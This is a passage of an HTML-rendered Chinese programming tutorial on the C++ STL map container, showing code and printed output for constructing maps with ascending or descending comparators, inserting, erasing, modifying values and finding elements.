容器，使用小于比较器</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    map<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> string<span class=\"token punctuation\">,</span> greater<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">>></span> m2<span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 构造一个空的 map 容器，使用大于比较器</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    map<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> string<span class=\"token operator\">></span> m3<span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 构造一个空的 map 容器，默认使用小于比较器</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token comment\">// 用 [] 操作符给容器添加元素</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    m3<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    m3<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"world\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    m3<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"STL\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"m3:\\t\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>m3<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> m3<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> myPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token comment\">// 复制指定 map 容器区间的元素</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    map<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> string<span class=\"token punctuation\">,</span> greater<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">>></span> <span class=\"token function\">m4</span><span class=\"token punctuation\">(</span>m3<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> m3<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"m4:\\t\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>m4<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> m4<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> myPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token comment\">// 复制一个容器</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    map<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> string<span class=\"token punctuation\">,</span> greater<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">>></span> <span class=\"token function\">m5</span><span class=\"token punctuation\">(</span>m4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"m5:\\t\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>m5<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> m5<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> myPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>打印结果如下：</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>m3:     1:hello 2:STL   3:world</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>m4:     3:world 2:STL   1:hello</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>m5:     3:world 2:STL   1:hello</pre></td></tr></table></figure><p>其中我们的打印函数要做出改变了：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">myPrintFun</span><span class=\"token punctuation\">(</span>map<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span>string<span class=\"token operator\">></span><span class=\"token operator\">::</span>value_type vt<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> vt<span class=\"token punctuation\">.</span>first <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\":\"</span> <span class=\"token operator\">&lt;&lt;</span> vt<span class=\"token punctuation\">.</span>second <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"\\t\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h4 id=\"添加元素-3\"><a class=\"anchor\" href=\"#添加元素-3\">#</a> 添加元素</h4>\n<p>添加元素可以使用 insert 函数和 [] 的方式，Map 容器也不允许出现重复的键值（可以使用 Multimap 容器来使用重复的键值），并且默认会自动排序：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">MapInsert</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    map<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> string<span class=\"token operator\">></span> m1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token comment\">//insert 添加元素</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    m1<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">map</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> string<span class=\"token operator\">></span><span class=\"token operator\">::</span><span class=\"token function\">value_type</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"hh\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    m1<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">map</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> string<span class=\"token operator\">></span><span class=\"token operator\">::</span><span class=\"token function\">value_type</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"hh\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    m1<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">map</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> string<span class=\"token operator\">></span><span class=\"token operator\">::</span><span class=\"token function\">value_type</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"hh\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token comment\">//map 不允许插入 key 相同的元素</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    m1<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">map</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span>string<span class=\"token operator\">></span><span class=\"token operator\">::</span><span class=\"token function\">value_type</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"111\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"m1:\\t\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>m1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> m1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> myPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token comment\">// 还可以用 [] 操作符给 map 容器添加元素，上面已演示过了</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token comment\">// 也可以添加指定容器区间的值</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    map<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> string<span class=\"token punctuation\">,</span>greater<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">>></span> <span class=\"token function\">m2</span><span class=\"token punctuation\">(</span>m1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> m1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"m2:\\t\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>m2<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> m2<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> myPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>打印结果如下：</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>m1:     1:hh    2:hh    3:hh</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>m2:     3:hh    2:hh    1:hh</pre></td></tr></table></figure><h4 id=\"删除元素-3\"><a class=\"anchor\" href=\"#删除元素-3\">#</a> 删除元素</h4>\n<p>和 set 容器一样：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">MapDelete</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    map<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> string<span class=\"token operator\">></span> m1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>size_t i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">7</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        string <span class=\"token function\">s</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        m1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> s<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"m1:\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>m1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> m1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> myPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token comment\">// 根据元素的键值删除元素</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    m1<span class=\"token punctuation\">.</span><span class=\"token function\">erase</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"\\nm1.erase(2):\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>m1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> m1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> myPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    m1<span class=\"token punctuation\">.</span><span class=\"token function\">erase</span><span class=\"token punctuation\">(</span>m1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 删除迭代器指向的元素</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"\\ns.erase(s.begin()):\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>m1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> m1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> myPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    map<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> string<span class=\"token operator\">></span><span class=\"token operator\">::</span>iterator itA <span class=\"token operator\">=</span>  m1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    map<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> string<span class=\"token operator\">></span><span class=\"token operator\">::</span>iterator itB <span class=\"token operator\">=</span>  m1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    itB<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    itB<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>     m1<span class=\"token punctuation\">.</span><span class=\"token function\">erase</span><span class=\"token punctuation\">(</span>itA<span class=\"token punctuation\">,</span> itB<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 删除指定迭代器区间内的元素</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"\\n m1.erase(itA, itB):\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span> m1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>  m1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> myPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>打印结果如下：</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>m1:</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>0:a     1:aa    2:aaa   3:aaaa  4:aaaaa 5:aaaaaa        6:aaaaaaa</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>m1.erase(2):</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>0:a     1:aa    3:aaaa  4:aaaaa 5:aaaaaa        6:aaaaaaa</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>m1.erase(s.begin()):</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>1:aa    3:aaaa  4:aaaaa 5:aaaaaa        6:aaaaaaa</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>m1.erase(itA, itB):</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>4:aaaaa 5:aaaaaa        6:aaaaaaa</pre></td></tr></table></figure><h4 id=\"修改元素-2\"><a class=\"anchor\" href=\"#修改元素-2\">#</a> 修改元素</h4>\n<p>Set 容器不可以直接修改容器内的数据，但是在 Map 容器中是可以修改值 (value) 的，不可以修改键 (key) 的。</p>\n<p><code>m1[2] = &quot;123123&quot;; // 使用key去直接修改值</code></p>\n<h4 id=\"查找元素-2\"><a class=\"anchor\" href=\"#查找元素-2\">#</a> 查找元素</h4>\n<p>使用  <code>find</code>  函数。</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">MapFind</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    map<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> string<span class=\"token operator\">></span> m1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>size_t i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">7</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        string <span class=\"token function\">s</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        m1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> s<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"m1:\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>m1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> m1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> myPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    map<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> string<span class=\"token operator\">></span><span class=\"token operator\">::</span>iterator mit <span class=\"token operator\">=</span> m1<span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>mit <span class=\"token operator\">==</span> m1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"\\n没有找到键值为2的元素\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"\\n找到了键值为2的元素，值为：\"</span> <span class=\"token operator\">&lt;&lt;</span> mit<span class=\"token operator\">-></span>second <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    mit <span class=\"token operator\">=</span> m1<span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span><span class=\"token number\">33</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>mit <span class=\"token operator\">==</span> m1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"\\n没有找到键值为33的元素\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"\\n找到了键值为33的元素，值为：\"</span> <span class=\"token operator\">&lt;&lt;</span> mit<span class=\"token operator\">-></span>second <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td 